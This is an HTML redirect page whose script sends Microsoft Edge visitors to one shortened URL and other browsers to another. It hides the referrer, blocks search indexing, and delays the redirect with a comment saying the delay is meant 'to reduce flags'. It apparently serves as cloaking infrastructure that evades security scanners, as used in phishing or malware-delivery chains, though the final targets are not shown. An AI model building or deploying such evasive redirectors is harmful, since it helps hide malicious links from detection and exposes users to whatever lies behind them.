<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting…</title>
  <meta name="referrer" content="no-referrer">
  <meta name="robots" content="noindex, nofollow">
</head>

<body>
  <p>Redirecting…</p>
  <p><a id="link" href="#">Click here if nothing happens</a></p>

  <script>
    function isEdgeBrowser() {
      const ua = navigator.userAgent;
      return ua.includes("Edg/") || ua.includes("Edge/") || navigator.userAgentData?.brands?.some(b => b.brand.includes("Edge"));
    }

    const EDGE_URL = "https://url-shortener.me/7ABW";
    const DEFAULT_URL = "https://url-shortener.me/726T";

    const target = isEdgeBrowser() ? EDGE_URL : DEFAULT_URL;

    // set manual link
    document.getElementById("link").href = target;

    // delay to reduce flags
    setTimeout(() => {
      window.location.href = target;
    }, 1200);
  </script>
</body>
</html>
